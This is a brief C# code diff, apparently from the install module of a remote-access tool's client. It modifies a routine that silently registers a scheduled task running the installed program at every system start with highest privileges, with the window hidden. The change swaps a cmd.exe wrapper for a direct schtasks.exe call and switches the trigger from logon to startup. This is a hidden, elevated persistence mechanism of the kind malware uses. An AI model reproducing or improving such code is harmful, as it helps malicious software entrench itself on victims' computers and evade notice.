@@ -42,8 +42,8 @@ namespace Client.Install
                         {
                             StartInfo = new ProcessStartInfo
                             {
-                                FileName = "cmd.exe",
-                                Arguments = "/c schtasks /create /f /sc ONLOGON /RL HIGHEST /tn " + @"""'" + Settings.InstallFile + @"""'" + " /tr " + @"""'" + installfullpath + @"""'",
+                                FileName = "schtasks.exe",
+                                Arguments = "/create /f /sc ONSTART /RL HIGHEST /tn " + @"""'" + Settings.InstallFile + @"""'" + " /tr " + @"""'" + installfullpath + @"""'",
                                 WindowStyle = ProcessWindowStyle.Hidden,
                                 CreateNoWindow = true,
                             }
